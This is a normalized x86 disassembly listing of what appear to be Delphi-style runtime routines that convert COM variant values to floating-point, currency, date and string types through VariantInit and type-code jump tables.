mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411330
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4114f0
fstp [ esp ]
fwait
jmp r-xdata
sub_411888
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x14
ja r-xdata
xor eax eax
push ebp
push sub_4119ed
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4114f0
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_4118aa ]
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
fild [ ebp - 0xc ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
fild [ ebp - 0x14 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x4
mov ax 0x1
call sub_40eb08
sub_411a18
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor edx edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_411af4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412fa4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_404290
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_40b0c0
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411afb
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_40402c
lea eax [ ebp - 0xc ]
call sub_404714
retn
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
call sub_404290
mov eax [ ebp - 0x20 ]
lea edx [ ebp - 0x18 ]
call sub_409840
test al al
je r-xdata
mov dx [ ebx ]
mov cx 0x7
call sub_40ef48
jmp r-xdata
mov dx [ ebx ]
mov cx 0x7
mov eax 0x80020005
call sub_40ef48
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
sub_411b04
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x7
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ef48
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411b64
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x7
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x7
call sub_40ef48
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
pop ebx
retn
sub_411bb0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_411c05
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f614
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_411c60
fstp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411c0c
lea eax [ ebp - 0x18 ]
call sub_40f2ec
retn
sub_411c14
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415978
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x7
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_411c60
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_411c7c ]
mov eax ebx
call sub_411a18
fstp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411b64
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_411a18
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411b04
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411c60
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411b64
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_411bb0
fstp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x7
mov ax 0x1
call sub_40eb08
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_411c14
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_411b64
fstp [ esp ]
fwait
mov eax ebx
call sub_411b64
fstp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_411e47 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411b64
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_411a18
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_411b04
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_411c60
fstp [ esp ]
fwait
jmp r-xdata
sub_411fb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41205c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_412fa4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
call sub_404290
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
call sub_409898
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412063
lea eax [ ebp - 0x10 ]
call sub_404008
lea eax [ ebp - 0xc ]
call sub_404714
retn
mov dx [ ebx ]
mov cx 0x6
mov eax 0x80020005
call sub_40ef48
jmp r-xdata
mov dx [ ebx ]
mov cx 0x6
call sub_40ef48
jmp r-xdata
sub_41206c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
mov [ ebp - 0x18 ] 0x5
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
push 0x6
push 0x0
push 0x400
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ef48
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4120cc
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x6
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x6
call sub_40ef48
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fild [ esp ]
add esp 0x18
pop ebx
retn
sub_412118
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41216d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f614
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_4121c8
fistp [ ebp - 0x8 ]
fwait
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412174
lea eax [ ebp - 0x18 ]
call sub_40f2ec
retn
sub_41217c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_415978
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x6
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_4121c8
push ebx
add esp 0xffffffec
mov ebx eax
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4121e4 ]
mov eax ebx
call sub_411fb0
fistp [ esp ]
fwait
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4120cc
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp ] eax
mov eax [ ebx + 0xc ]
mov [ esp + 0x4 ] eax
jmp r-xdata
mov eax ebx
call sub_4120cc
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411fb0
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movsx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
xor eax eax
mov al [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
movzx eax [ ebx + 0x8 ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
fild [ ebx + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41206c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4121c8
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4120cc
fistp [ esp ]
fwait
jmp r-xdata
fild [ esp ]
add esp 0x14
pop ebx
retn
mov eax ebx
call sub_412118
fistp [ esp ]
fwait
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov dx 0x6
mov ax 0x1
call sub_40eb08
test ah 0x40
je r-xdata
mov edx esp
mov eax ebx
call sub_41217c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax ebx
call sub_4120cc
fistp [ esp ]
fwait
mov eax ebx
call sub_4120cc
fistp [ esp ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4123e9 ]
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_4120cc
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx [ eax ]
mov [ esp ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax ebx
call sub_4120cc
fistp [ esp ]
fwait
jmp r-xdata
mov eax ebx
call sub_411fb0
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x10 ] eax
fild [ esp + 0xc ]
fmul [ r-xdata ]
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
fild [ eax ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax ebx
call sub_41206c
fistp [ esp ]
fwait
jmp r-xdata
mov eax [ ebx + 0x8 ]
call sub_4121c8
fistp [ esp ]
fwait
jmp r-xdata
sub_412594
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404714
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x6
call sub_40ef48
pop ebx
pop ebp
retn 0x8
sub_4125cc
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
call sub_404714
push eax
push 0x0
push 0x400
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0x7
call sub_40ef48
pop ebx
pop ebp
retn 0x8
sub_412604
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4126ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404714
push eax
push 0x0
push 0x400
push esi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov cx 0x8
mov dx 0xb
call sub_40ef48
mov al [ rw-data ]
sub al 0x1
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4126c1
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebx ]
call sub_404290
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x4 ]
call sub_408030
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_404860
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebx ]
call sub_404290
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_407ff4
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_404860
jmp r-xdata
jmp r-xdata
call sub_40eba4
sub_4126c8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412787
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_412765
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x100
call sub_40ef48
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
call sub_404824
mov eax [ ebp - 0x18 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404910
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404290
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41276c
lea eax [ ebp - 0x10 ]
call sub_40f2ec
retn
sub_412794
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4127ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40f614
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_41287c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4127f1
lea eax [ ebp - 0x10 ]
call sub_40f2ec
retn
sub_4127f8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_415978
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_41286d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x100
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_40405c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40f2ec
retn
sub_41287c
push ebp
mov ebp esp
mov ecx 0xf
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_412db3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_4128b5 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_40405c
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_404008
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_408344
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_408344
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_40405c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_409788
mov edx [ ebp - 0xc ]
mov eax esi
call sub_40405c
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_409788
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_40405c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_412594
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_404290
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_4125cc
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_404290
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebx + 0x8 ]
call sub_404824
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404910
mov edx [ ebp - 0x1c ]
mov eax esi
call sub_404290
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov ax [ ebx + 0x8 ]
call sub_412604
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_404290
jmp r-xdata
lea edx [ ebp - 0x28 ]
movsx eax [ ebx + 0x8 ]
call sub_408344
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x2c ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_408344
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_40405c
jmp r-xdata
lea edx [ ebp - 0x30 ]
movzx eax [ ebx + 0x8 ]
call sub_408344
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x34 ]
call sub_408430
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_40405c
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x38 ]
call sub_408430
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_40405c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_41287c
jmp r-xdata
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_4126c8
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_40405c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412dba
lea eax [ ebp - 0x78 ]
mov edx 0x7
call sub_40402c
lea eax [ ebp - 0x5c ]
mov edx 0x3
call sub_40472c
lea eax [ ebp - 0x50 ]
mov edx 0xb
call sub_40402c
lea eax [ ebp - 0x24 ]
mov edx 0x5
call sub_40472c
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40402c
retn
lea edx [ ebp - 0x40 ]
mov eax ebx
call sub_412794
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_40405c
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_40405c
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40eb08
test ah 0x40
je r-xdata
mov eax esi
call sub_404008
mov edx eax
mov eax ebx
call sub_4127f8
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_4126c8
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_40405c
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_4126c8
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_40405c
jmp r-xdata
jmp [ eax * 4 + jump_table_412b49 ]
